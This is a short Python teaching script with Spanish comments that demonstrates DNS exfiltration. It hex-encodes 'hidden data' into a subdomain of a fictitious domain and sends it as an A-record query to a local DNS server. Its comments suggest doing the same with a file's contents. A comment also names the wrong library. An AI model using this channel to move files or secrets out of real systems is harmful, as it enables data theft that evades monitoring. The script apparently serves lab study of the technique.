#!/usr/bin/python3
# Archivo ....: dns_client_1.py
# Autor ......: Gabriel Martí
# Fecha ......: 20/12/2022
# Descripción : Programa que envia una sola petición DNS a nuestro servidor.
#               Solo hace una petición de un Registro A para un dominio arbitrario
#               y espera la respuesta del servidor.
#               En este ejemplo se ha simplificado mucho toda la estructura de la
#               petición para usar únicamente lo imprescindible.
#               Ten en cuenta que deberás leer el contenido del archivo y convertir
#               esta a hexadecimal (aquí se parte de una muestra ya en hexa).
#
#               Todo el código está basado en el uso de la libreria "dnslib"
#               https://pypi.org/project/dnslib/

import dns.message
import dns.query

servidor = "127.0.0.1"                      # Host destino
puerto = 53                                 # Puerto
dominio = "secreto.com"                     # Nombre de dominio inventado
subdominio = "6461746f73206f63756c746f73"   # datos ocultos en hexadecimal

# Se podía hacer todo junto previamente, pero así podrás ver como
# separar la parte de datos exfiltrados del dominio ficticio.
dominiocompleto = subdominio+"."+dominio

print("Inicio del envio")

# Crear una petición DNS indicando que se hac una petición del registro A
# vendría a ser parecido a hacer un nslookup del dominio indicado
request = dns.message.make_query(dominiocompleto, dns.rdatatype.A)

# Enviar la petición al servidor DNS local y espera respuesta
# en los próximos 5 segundo. Tiempo más que suficiente.
# También podría ser un valor parametrizable en el cliente.
response = dns.query.udp(request, servidor, timeout=5)

# Imprime la respuesta recibida del servidor que únicamente
# nos sirve para confirmar que ha recibido los datos.
print("Respuesta: ", response)
    
print("Fin del envío")

